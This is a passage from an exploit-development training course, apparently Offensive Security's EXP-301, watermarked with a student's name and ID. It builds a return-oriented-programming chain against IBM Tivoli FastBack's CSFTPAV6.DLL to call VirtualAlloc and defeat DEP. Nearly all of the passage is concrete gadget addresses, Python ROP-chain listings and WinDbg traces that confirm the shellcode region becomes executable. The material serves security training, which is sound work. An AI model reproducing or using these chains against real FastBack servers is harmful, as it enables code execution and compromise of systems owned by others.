cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207 
CSFTPAV6!FtpUploadFileW+0xbd18: 
5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d1de304=46464646 
 
0:006> p 
eax=0d1de514 ebx=05f9bc20 ecx=fffffdf0 edx=77071670 esi=0d1de304 edi=00000000 
eip=5051cbb8 esp=0d1de37c ebp=51515151 iopl=0         nv up ei pl nz na pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207 
CSFTPAV6!FtpUploadFileW+0xbd1a: 
5051cbb8 c3              ret 
 
0:006> dd poi(esi) L4 
0d1de514  43434343 43434343 43434343 43434343 
Listing 497 - Overwriting the return address placeholder 
Here we find that the gadget containing the “MOV DWORD [ESI], EAX” instruction successfully 
overwrote the placeholder value and the new return address points to our buffer. 
After patching the return address, it is clear that building a ROP chain requires creativity. We also 
find that reusing the same gadgets helps when performing similar actions. 
In the next section, we are going to set up the four arguments required for VirtualAlloc. 
9.4.6.1 Exercises 
1. 
Update the ROP chain to increase ESI by four. 
2. 
Update the ROP chain to gather the shellcode address on the stack by adding a placeholder 
offset to ESI. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
414 
3. 
Overwrite the dummy return address using ROP with the newly calculated return address. 
9.4.7 Patching Arguments 
We have successfully created and executed a partial ROP chain that locates the address of 
VirtualAlloc from the IAT and the shellcode address, and then updates the API call skeleton on the 
stack. 
In this section, we must patch all four arguments required by VirtualAlloc to disable DEP. 
Listing 498 repeats the prototype of VirtualAlloc, which includes the four required arguments. 
 LPVOID WINAPI VirtualAlloc( 
   _In_opt_ LPVOID lpAddress, 
   _In_     SIZE_T dwSize, 
   _In_     DWORD  flAllocationType, 
   _In_     DWORD  flProtect 
 ); 
Listing 498 - VirtualAlloc function prototype 
To reiterate, lpAddress should be the shellcode address, dwSize should be 0x01, flAllocationType 
should be 0x1000, and flProtect should be 0x40. 
First, we are going to handle lpAddress, which should point to the same value as the return 
address. 
At the end of the last section, ESI contained the address on the stack where the return address 
(shellcode address) was written. This means that ESI is only four bytes lower than lpAddress, and 
we can realign the register by reusing the same INC ESI instructions as we used before. 
Additionally, since lpAddress needs to point to our shellcode, we can reuse the same gadgets as 
before and only subtract a different negative value from EAX. 
In the previous example, we used the somewhat arbitrary value of -0x210 to align EAX to our 
shellcode. Since we increased ESI by 4, we need to use -0x20C or 0xfffffdf4 this time, as shown in 
the updated ROP chain below.  
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn 
... 
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret 
rop += pack("<L", (0x42424242)) # junk 
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret 
rop += pack("<L", (0x505115a3)) # pop ecx ; ret 
rop += pack("<L", (0xfffffdf4)) # -0x20c 
rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret 
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret 
rop += b"C" * (0x400 - 276 - 4 - len(rop)) 
Listing 499 - Fetching and writing lpAddress 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
415 
The new part of the ROP chain also reuses the write gadget to overwrite the placeholder value in 
the API skeleton call. 
It is getting a lot easier to expand on our technique because we have already located most of the 
required gadgets and performed similar actions. 
To verify our ROP chain, we execute it. We set a breakpoint on the last gadget like we did in the 
last section, only this time we must continue execution until it is triggered the third time: 
0:078> bp 0x5051cbb6 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL -  
 
0:078> g 
Breakpoint 0 hit 
eax=75f238c0 ebx=05ffafe8 ecx=ffffffff edx=77251670 esi=0d46e300 edi=00000000 
eip=5051cbb6 esp=0d46e350 ebp=51515151 iopl=0         nv up ei pl nz ac po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213 
CSFTPAV6!FtpUploadFileW+0xbd18: 
5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d46e300=45454545 
 
0:006> g 
Breakpoint 0 hit 
eax=0d46e514 ebx=05ffafe8 ecx=fffffdf0 edx=77251670 esi=0d46e304 edi=00000000 
eip=5051cbb6 esp=0d46e37c ebp=51515151 iopl=0         nv up ei pl nz na pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207 
CSFTPAV6!FtpUploadFileW+0xbd18: 
5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d46e304=46464646 
 
0:006> g 
Breakpoint 0 hit 
eax=0d46e514 ebx=05ffafe8 ecx=fffffdf4 edx=77251670 esi=0d46e308 edi=00000000 
eip=5051cbb6 esp=0d46e3a8 ebp=51515151 iopl=0         nv up ei pl nz na pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207 
CSFTPAV6!FtpUploadFileW+0xbd18: 
5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d46e308=00000000 
 
0:006> dd eax L4 
0d46e514  43434343 43434343 43434343 43434343 
Listing 500 - The first argument is written to the stack 
We find that EAX points to our placeholder shellcode location and that it contains the same 
address when the breakpoint is triggered the second and third times. This means that our 
calculation was correct and the same shellcode location is going to be used for the return 
address and lpAddress. 
Now we are going to move to dwSize, which we can set to 0x01, since VirtualAlloc will apply the 
new protections on the entire memory page. The issue is that the value is really a DWORD 
(0x00000001), so it will contain null bytes. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
416 
Once again, we must use a trick to avoid them, and in this case, we can take advantage of 
another math operation, negation. The NEG343 instruction will replace the value in a register with 
its two’s complement.344 
This is equivalent to subtracting the value from zero. When we do that with 0xffffffff (after 
ignoring the upper DWORD of the resulting QWORD), we get 0x01 (Listing 501): 
0:006> ? 0 - ffffffff 
Evaluate expression: -4294967295 = ffffffff`00000001 
Listing 501 - Subtracting 0xffffffff from 0 yields 0x1 
Stripping the upper part is done automatically since registers on a 32-bit operating system can 
only contain the lower DWORD. 
The steps we must perform for dwSize are: 
• 
Increase the ESI register by four with the increment gadgets to align it with the next 
placeholder argument in the API skeleton call. 
• 
Pop the value 0xffffffff into EAX and then negate it. 
• 
Write EAX onto the stack to patch the dwSize argument. 
Listing 502 shows this implementation in the updated ROP chain.  
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn 
... 
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret  
rop += pack("<L", (0xffffffff)) # -1 value that is negated 
rop += pack("<L", (0x50527840)) # neg eax ; ret 
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret 
rop += b"C" * (0x400 - 276 - 4 - len(rop)) 
Listing 502 - Fetching and writing dwSize argument 
When we execute the update ROP chain, we can set a breakpoint on the gadget containing the 
POP EAX instruction. We have already used it once before, so we need to continue to the second 
time the breakpoint is triggered: 
0:050> bp 0x5053a0f5 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL -  
 
0:050> g 
Breakpoint 0 hit 
eax=0d57e300 ebx=05fabe40 ecx=ffffffe4 edx=77071670 esi=0d57e300 edi=00000000 
 
343 (Aldeid, 2016), https://www.aldeid.com/wiki/X86-assembly/Instructions/neg 
344 (Wikipedia, 2020): 
https://en.wikipedia.org/wiki/Two%27s_complement#:~:text=Two's%20complement,with%20respect%20to%202N. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
417 
eip=5053a0f5 esp=0d57e338 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
CSFTPAV6!FtpUploadFileW+0x29257: 
5053a0f5 58              pop     eax 
 
0:063> g 
Breakpoint 0 hit 
eax=0d57e5c0 ebx=05fabe40 ecx=fffffdf4 edx=77071670 esi=0d57e30c edi=00000000 
eip=5053a0f5 esp=0d57e3bc ebp=51515151 iopl=0         nv up ei ng nz ac pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296 
CSFTPAV6!FtpUploadFileW+0x29257: 
5053a0f5 58              pop     eax 
 
0:063> p 
eax=ffffffff ebx=05fabe40 ecx=fffffdf4 edx=77071670 esi=0d57e30c edi=00000000 
eip=5053a0f6 esp=0d57e3c0 ebp=51515151 iopl=0         nv up ei ng nz ac pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296 
CSFTPAV6!FtpUploadFileW+0x29258: 
5053a0f6 c3              ret 
 
0:063> p 
eax=ffffffff ebx=05fabe40 ecx=fffffdf4 edx=77071670 esi=0d57e30c edi=00000000 
eip=50527840 esp=0d57e3c4 ebp=51515151 iopl=0         nv up ei ng nz ac pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296 
CSFTPAV6!FtpUploadFileW+0x169a2: 
50527840 f7d8            neg     eax 
 
0:063> p 
eax=00000001 ebx=05fabe40 ecx=fffffdf4 edx=77071670 esi=0d57e30c edi=00000000 
eip=50527842 esp=0d57e3c4 ebp=51515151 iopl=0         nv up ei pl nz ac po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213 
CSFTPAV6!FtpUploadFileW+0x169a4: 
50527842 c3              ret 
 
0:063> p 
eax=00000001 ebx=05fabe40 ecx=fffffdf4 edx=77071670 esi=0d57e30c edi=00000000 
eip=5051cbb6 esp=0d57e3c8 ebp=51515151 iopl=0         nv up ei pl nz ac po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213 
CSFTPAV6!FtpUploadFileW+0xbd18: 
5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d57e30c=48484848 
 
0:063> p 
eax=00000001 ebx=05fabe40 ecx=fffffdf4 edx=77071670 esi=0d57e30c edi=00000000 
eip=5051cbb8 esp=0d57e3c8 ebp=51515151 iopl=0         nv up ei pl nz ac po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213 
CSFTPAV6!FtpUploadFileW+0xbd1a: 
5051cbb8 c3              ret 
 
0:063> dd esi - c L4 
0d57e300  76da38c0 0d57e514 0d57e514 00000001 
Listing 503 - Writing dwSize argument to the stack 
The negation trick works and we end up with 0x01 in EAX, which is then written to the stack. 
Listing 503 also shows the resulting stack layout of the values that are written so far, and it is 
clear that the return address and lpAddress are equal. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
418 
Now we must move to flAllocationType, which must be set to 0x1000. We could try to reuse the 
trick of negation but we notice that two’s complement to 0x1000 is 0xfffff000, which also 
contains null bytes: 
0:063> ? 0 - 1000 
Evaluate expression: -4096 = fffff000 
Listing 504 - Two’s complement for 0x1000 
While it would be possible to perform some tricks to fix this problem, we are going to use a 
different technique to highlight the fact that when selecting gadgets, we must often think 
creatively. 
We’re going to use the existing gadgets we found, which will allow us to pop arbitrary values into 
EAX and ECX and subsequently perform an addition of them. 
Let’s choose a large, arbitrary value like 0x80808080 that does not contain null-bytes. if we 
subtract this value from 0x1000, we get the value 0x7F7F8F80 which is also null free. 
0:063> ? 1000 - 80808080 
Evaluate expression: -2155901056 = ffffffff`7f7f8f80 
 
0:063> ? 80808080 + 7f7f8f80 
Evaluate expression: 4294971392 = 00000001`00001000 
Listing 505 - Finding large values that add to 0x1000 
Now we need to update our ROP chain to pop 0x80808080 into EAX, pop 0x7f7f8f80 into ECX, 
and then add them together.  
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn 
... 
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret  
rop += pack("<L", (0x80808080)) # first value to be added 
rop += pack("<L", (0x505115a3)) # pop ecx ; ret 
rop += pack("<L", (0x7f7f8f80)) # second value to be added 
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret 
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret 
rop += b"C" * (0x400 - 276 - 4 - len(rop)) 
Listing 506 - Fetching and writing flAllocationType argument 
Notice that we began by increasing ESI by four as usual to align to the next API argument, and we 
also reused the same write gadget at the end of the chain to update the flAllocationType value on 
the stack. 
To view this in action, we set a breakpoint on the “ADD EAX, ECX” ROP gadget at address 
0x5051579a. Since this gadget is used multiple times, we can create a conditional breakpoint to 
avoid breaking at it each time. 
We know that EAX must contain the value 0x80808080 when EAX and ECX are added together. 
We’ll use the .if statement in our breakpoint in order to break on the target address only when EAX 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
419 
is set to 0x80808080. Due to sign extension, we must perform a bitwise AND operation to obtain 
the correct result in the comparison. 
The breakpoint and execution of the ROP gadgets is shown in Listing 507. 
0:078> bp 0x5051579a ".if (@eax & 0x0`ffffffff) = 0x80808080 {} .else {gc}" 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL -  
 
0:078> g 
eax=80808080 ebx=05f9b648 ecx=7f7f8f80 edx=77251670 esi=0d39e310 edi=00000000 
eip=5051579a esp=0d39e3ec ebp=51515151 iopl=0         nv up ei ng nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000282 
CSFTPAV6!FtpUploadFileW+0x48fc: 
5051579a 03c1            add     eax,ecx 
 
0:055> p 
eax=00001000 ebx=05f9b648 ecx=7f7f8f80 edx=77251670 esi=0d39e310 edi=00000000 
eip=5051579c esp=0d39e3ec ebp=51515151 iopl=0         nv up ei pl nz na pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207 
CSFTPAV6!FtpUploadFileW+0x48fe: 
5051579c c3              ret 
 
0:055> p 
eax=00001000 ebx=05f9b648 ecx=7f7f8f80 edx=77251670 esi=0d39e310 edi=00000000 
eip=5051cbb6 esp=0d39e3f0 ebp=51515151 iopl=0         nv up ei pl nz na pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207 
CSFTPAV6!FtpUploadFileW+0xbd18: 
5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d39e310=00000000 
Listing 507 - Patching flAllocationType on the stack 
We find that the ADD operation created the correct value in EAX (0x1000), which was then used to 
patch the placeholder argument on the stack. 
The last argument is the new memory protection value, which, in essence, is what allows us to 
bypass DEP. We want the enum PAGE_EXECUTE_READWRITE, which has the numerical value 
0x40. 
In order to write that to the stack, we will reuse the same technique we did for flAllocationType. 
Listing 508 shows us the values to use. 
0:063> ? 40 - 80808080 
Evaluate expression: -2155905088 = ffffffff`7f7f7fc0 
 
0:063> ? 80808080 + 7f7f7fc0 
Evaluate expression: 4294967360 = 00000001`00000040 
Listing 508 - Finding two values that add to 0x40 
According to the additions, we can use the values 0x80808080 and 0x7f7f7fc0 to obtain the 
desired value of 0x40. Listing 509 illustrates the ROP chain to implement. It is an exact copy of 
the previous one except for the values to add.  
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn 
... 
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
420 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret 
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret  
rop += pack("<L", (0x80808080)) # first value to be added 
rop += pack("<L", (0x505115a3)) # pop ecx ; ret 
rop += pack("<L", (0x7f7f7fc0)) # second value to be added 
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret 
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret 
rop += pack("<L", (0x5051e4db)) # int3 ; push eax ; call esi 
rop += b"C" * (0x400 - 276 - 4 - len(rop)) 
Listing 509 - Fetching and writing flProtect argument 
After the last gadget, which writes the flProtect argument to the stack, we add an additional 
gadget. This gadget’s first instruction is a software breakpoint and will not be part of the final 
exploit. This will allow us to execute the entire ROP chain and catch the execution flow just after 
the flProtect dummy value has been patched. 
0:066> g 
(146c.1dcc): Break instruction exception - code 80000003 (first chance) 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL -  
eax=00000040 ebx=05f6b8f0 ecx=7f7f7fc0 edx=77071670 esi=0d28e314 edi=00000000 
eip=5051e4db esp=0d28e41c ebp=51515151 iopl=0         nv up ei pl nz na po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203 
CSFTPAV6!FtpUploadFileW+0xd63d: 
5051e4db cc              int     3 
 
0:006> dds esi - 14 L6 
0d28e300  76da38c0 KERNEL32!VirtualAllocStub 
0d28e304  0d28e514 
0d28e308  0d28e514 
0d28e30c  00000001 
0d28e310  00001000 
0d28e314  00000040 
Listing 510 - Full ROP chain executed 
From the output of Listing 510, we notice that all the arguments are set up correctly and that our 
trick of using a breakpoint gadget worked. Remember, if we forget to remove this gadget in the 
final exploit, it will cause an access violation. 
We have finally laid out all the work needed before invoking VirtualAlloc. In the next section, we 
can move forward to the last stage and finally disable DEP. 
9.4.7.1 Exercises 
1. 
Go through the creation of the ROP chain segments for each of the arguments, and verify 
that you obtain the desired results when executed. 
2. 
Assemble the complete ROP chain and execute it to the end, through the use of the 
breakpoint gadget, and verify that all arguments have been configured correctly. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
421 
3. 
To write the value 0x01 for the dwSize argument, we used a gadget with a NEG instruction. 
Try to modify that part of the ROP chain to use gadgets containing XOR EAX, EAX, and INC 
EAX instead. 
9.4.8 Executing VirtualAlloc 
The ROP chain to set up the address for VirtualAlloc, the return address, and all four arguments 
has been created and verified to work. The only step that remains to bypass DEP is to invoke the 
API. 
To execute VirtualAlloc, we must add a few more ROP gadgets so we can return to the API 
address we wrote on the stack. Additionally, the return address we wrote onto the stack will only 
be used if the stack pointer is correctly aligned. 
Sadly, there is no simple way to modify ESP, so we must take a small detour. The only useful 
gadget we found for this task is a MOV ESP, EBP ; POP EBP ; RET. However, in order to use it, we 
need to align EBP to the address of VirtualAlloc on the stack. 
When the ROP chain is finished patching the arguments for VirtualAlloc, ESI will contain the stack 
address of the last argument (flProtect). To obtain the stack address where VirtualAlloc was 
patched, we can move the contents of ESI into EAX and subtract a small value from it. 
Any small value will contain null bytes, so instead we can leverage the fact that when 32-bit 
registers overflow, any bits higher than 32 will be discarded. Instead of subtracting a small value 
that contains null bytes, we can add a large value. This will allow us to align EAX with the 
VirtualAlloc address on the stack. 
Once EAX contains the correct address, we move its content into EBP through an XCHG EAX, 
EBP; RET gadget. Finally, we can move the contents of EBP into ESP with the gadget we initially 
found. 
The gadget that moves EBP into ESP has a side effect of popping a value into EBP. We must 
compensate for this and configure the stack so that a dummy DWORD just before the VirtualAlloc 
address is popped into EBP.  
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn 
... 
rop += pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn 
rop += pack("<L", (0x42424242)) # junk 
rop += pack("<L", (0x505115a3)) # pop ecx ; ret 
rop += pack("<L", (0xffffffe8)) # negative offset value 
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret 
rop += pack("<L", (0x5051571f)) # xchg eax, ebp ; ret 
rop += pack("<L", (0x50533cbf)) # mov esp, ebp ; pop ebp ; ret 
rop += b"C" * (0x400 - 276 - 4 - len(rop)) 
Listing 511 - Aligning ESP for VirtualAlloc execution 
Through trial and error, we find that we want to subtract 0x18 bytes from EAX to obtain the 
correct stack pointer alignment, which means we must add 0xffffffe8 bytes. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
422 
 
Note that the ROP gadget containing the breakpoint instruction must be removed 
from the updated ROP chain. 
The first gadget in the newly added part of the ROP chain is used four times. To break directly on 
the fourth occurrence, we can leverage the fact that this part of the ROP chain comes just after 
patching flProtect on the stack. 
This means EAX contains the value 0x40 to indicate readable, writable, and executable memory. 
We can use this to set a conditional breakpoint at 0x5050118e and only trigger it if EAX contains 
the value 0x40. 
Listing 512 shows execution of the first half of the ROP chain. 
0:006> bp 0x5050118e ".if @eax = 0x40 {} .else {gc}" 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL -  
 
0:006> g 
eax=00000040 ebx=0601b758 ecx=7f7f7fc0 edx=77251670 esi=0d4ae314 edi=00000000 
eip=5050118e esp=0d4ae41c ebp=51515151 iopl=0         nv up ei pl nz na po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203 
CSFTPAV6+0x118e: 
5050118e 8bc6            mov     eax,esi 
 
0:063> p 
eax=0d4ae314 ebx=0601b758 ecx=7f7f7fc0 edx=77251670 esi=0d4ae314 edi=00000000 
eip=50501190 esp=0d4ae41c ebp=51515151 iopl=0         nv up ei pl nz na po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203 
CSFTPAV6+0x1190: 
50501190 5e              pop     esi 
 
0:063> p 
eax=0d4ae314 ebx=0601b758 ecx=7f7f7fc0 edx=77251670 esi=42424242 edi=00000000 
eip=50501191 esp=0d4ae420 ebp=51515151 iopl=0         nv up ei pl nz na po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203 
CSFTPAV6+0x1191: 
50501191 c3              ret 
 
0:063> p 
eax=0d4ae314 ebx=0601b758 ecx=7f7f7fc0 edx=77251670 esi=42424242 edi=00000000 
eip=505115a3 esp=0d4ae424 ebp=51515151 iopl=0         nv up ei pl nz na po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203 
CSFTPAV6!FtpUploadFileW+0x705: 
505115a3 59              pop     ecx 
 
0:063> p 
eax=0d4ae314 ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000 
eip=505115a4 esp=0d4ae428 ebp=51515151 iopl=0         nv up ei pl nz na po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203 
CSFTPAV6!FtpUploadFileW+0x706: 
505115a4 c3              ret 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
423 
 
0:063> p 
eax=0d4ae314 ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000 
eip=5051579a esp=0d4ae42c ebp=51515151 iopl=0         nv up ei pl nz na po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203 
CSFTPAV6!FtpUploadFileW+0x48fc: 
5051579a 03c1            add     eax,ecx 
 
0:063> p 
eax=0d4ae2fc ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000 
eip=5051579c esp=0d4ae42c ebp=51515151 iopl=0         nv up ei pl nz na pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207 
CSFTPAV6!FtpUploadFileW+0x48fe: 
5051579c c3              ret 
 
0:063> dds eax L2 
0d4ae2fc  41414141 
0d4ae300  75f238c0 KERNEL32!VirtualAllocStub 
Listing 512 - ROP chain to align EAX 
By looking at the above listing, we find that our trick of subtracting a large negative value from 
EAX resulted in EAX containing the stack address four bytes prior to VirtualAlloc. 
This is expected and intended since the gadget that moves EBP into ESP contains a “POP EBP” 
instruction, which increments the stack pointer by four bytes. This is why we aligned EAX to point 
four bytes before the VirtualAlloc address. 
Listing 513 shows the second half of the ROP chain, which executes VirtualAlloc. 
0:063> p 
eax=0d4ae2fc ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000 
eip=5051571f esp=0d4ae430 ebp=51515151 iopl=0         nv up ei pl nz na pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207 
CSFTPAV6!FtpUploadFileW+0x4881: 
5051571f 95              xchg    eax,ebp 
 
0:063> p 
eax=51515151 ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000 
eip=50515720 esp=0d4ae430 ebp=0d4ae2fc iopl=0         nv up ei pl nz na pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207 
CSFTPAV6!FtpUploadFileW+0x4882: 
50515720 c3              ret 
 
0:063> p 
eax=51515151 ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000 
eip=50533cbf esp=0d4ae434 ebp=0d4ae2fc iopl=0         nv up ei pl nz na pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207 
CSFTPAV6!FtpUploadFileW+0x22e21: 
50533cbf 8be5            mov     esp,ebp 
 
0:063> p 
eax=51515151 ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000 
eip=50533cc1 esp=0d4ae2fc ebp=0d4ae2fc iopl=0         nv up ei pl nz na pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207 
CSFTPAV6!FtpUploadFileW+0x22e23: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
424 
50533cc1 5d              pop     ebp 
 
0:063> p 
eax=51515151 ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000 
eip=50533cc2 esp=0d4ae300 ebp=41414141 iopl=0         nv up ei pl nz na pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207 
CSFTPAV6!FtpUploadFileW+0x22e24: 
50533cc2 c3              ret 
 
0:063> p 
eax=51515151 ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000 
eip=75f238c0 esp=0d4ae304 ebp=41414141 iopl=0         nv up ei pl nz na pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207 
KERNEL32!VirtualAllocStub: 
75f238c0 8bff            mov     edi,edi 
Listing 513 - ROP chain to invoke VirtualAlloc 
Fortunately, we find that ESP is aligned correctly with the API skeleton call, which allows us to 
return into VirtualAlloc. 
Let’s check the memory protections of the shellcode address before and after executing the API. 
0:006> dds esp L1 
0d55e304  0d55e514 
 
0:006> !vprot 0d55e514 
BaseAddress:       0d55e000 
AllocationBase:    0d4c0000 
AllocationProtect: 00000004  PAGE_READWRITE 
RegionSize:        00062000 
State:             00001000  MEM_COMMIT 
Protect:           00000004  PAGE_READWRITE 
Type:              00020000  MEM_PRIVATE 
 
0:006> pt 
eax=0d55e000 ebx=0602b578 ecx=0d55e2d4 edx=77071670 esi=42424242 edi=00000000 
eip=73be2623 esp=0d55e304 ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
KERNELBASE!VirtualAlloc+0x53: 
73be2623 c21000          ret     10h 
 
0:006> !vprot 0d55e514 
BaseAddress:       0d55e000 
AllocationBase:    0d4c0000 
AllocationProtect: 00000004  PAGE_READWRITE 
RegionSize:        00001000 
State:             00001000  MEM_COMMIT 
Protect:           00000040  PAGE_EXECUTE_READWRITE 
Type:              00020000  MEM_PRIVATE 
